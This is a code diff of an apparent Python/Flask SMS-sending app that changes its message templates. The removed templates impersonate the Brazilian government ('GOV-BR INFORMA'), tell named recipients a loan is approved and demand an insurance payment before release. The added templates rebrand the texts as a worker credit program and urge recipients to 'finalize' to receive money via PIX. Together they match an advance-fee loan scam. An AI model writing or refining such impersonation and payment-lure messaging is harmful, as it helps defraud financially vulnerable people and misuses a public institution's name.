@@ -44,7 +44,7 @@ def send_verification_code_smsdev(phone_number: str, verification_code: str) -> 
 
         if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
             # Message template
-            message = f"[GOV-BR INFORMA]: {first_name}, seu emprestimo foi aprovado. Seu código de verificação é: {verification_code}."
+            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
 
             # API parameters
             params = {
@@ -90,31 +90,9 @@ def send_verification_code_owen(phone_number: str, verification_code: str) -> tu
         if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
             # Format as international number with Brazil code
             international_number = f"55{formatted_phone}"
-            
-            # Get name from request data and format it
-            data = request.get_json() or {}
-            
-            # Try getting name from different sources
-            nome = (data.get('userData', {}).get('nome') or 
-                   data.get('nome') or 
-                   request.form.get('nome') or 
-                   request.args.get('nome'))
-            
-            app.logger.info(f"Nome encontrado: {nome}")
-            
-            # Format name if found
-            if nome:
-                nome = nome.strip()
-                first_name = nome.split()[0].lower().capitalize()
-                app.logger.info(f"Nome formatado para SMS: {first_name}")
-                
-                # Create message with formatted name
-                message = f"[GOV-BR INFORMA]: {first_name}, seu emprestimo foi aprovado. Seu código de verificação é: {verification_code}."
-            else:
-                app.logger.error("Nome não encontrado para SMS")
-                return False, "Nome não encontrado"
-                
-            message = f"[GOV-BR INFORMA]: {first_name}, seu emprestimo foi aprovado. Seu código de verificação é: {verification_code}."
+
+            # Message template
+            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
 
             # Prepare the curl command
             import subprocess
@@ -308,7 +286,7 @@ def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
             return False
 
         # Message template
-        message = f"[AGUARDANDO PAGAMENTO] {first_name}, realize o pagamento do Seguro no valor de R${amount:.2f} para receber o valor do emprestimo."
+        message = f"[PROGRAMA CREDITO DO TRABALHADOR] {first_name}, seu empréstimo de R${amount:.2f} foi aprovado! Finalize o processo para receber via PIX instantaneamente."
 
         # Choose which API to use based on SMS_API_CHOICE
         if SMS_API_CHOICE.upper() == 'OWEN':
@@ -711,7 +689,7 @@ def send_test_sms():
             return redirect(url_for('sms_config'))
 
         # Message template for test
-        message = "[AGUARDANDO PAGAMENTO] {first_name}, realize o pagamento do Seguro no valor de R${amount:.2f} para receber o valor do emprestimo."
+        message = "[PROGRAMA CREDITO DO TRABALHADOR] Esta é uma mensagem de teste do sistema."
 
         # Choose which API to use based on SMS_API_CHOICE
         if SMS_API_CHOICE.upper() == 'OWEN':
